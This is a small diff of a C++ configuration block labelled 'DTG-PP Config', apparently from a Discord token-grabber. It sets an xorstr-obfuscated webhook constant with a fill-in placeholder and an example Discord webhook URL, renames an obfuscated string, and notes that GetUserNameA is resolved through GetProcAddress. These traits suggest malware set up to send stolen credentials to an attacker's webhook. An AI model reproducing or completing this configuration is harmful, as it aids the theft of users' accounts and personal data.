@@ -12,7 +12,7 @@
 // DTG-PP Config
 
 const std::string webhook = xorstr_("{PUT-YOUR-WEBHOOK-HERE}"); // ex: https://discord.com/api/webhooks/876872056250196018/Pgt9o5JTQZgm6G5ciBmKYvPGm2zfwJFdkBIvzwuHNX4iWz4eDvGyJA_yhNtDQl7d5F82
-const std::string fucker = xorstr_("SandisSib");
+const std::string fucker = xorstr_("SundisSib");
 
 // GetProcAddress | typedef GetUserNameA
 
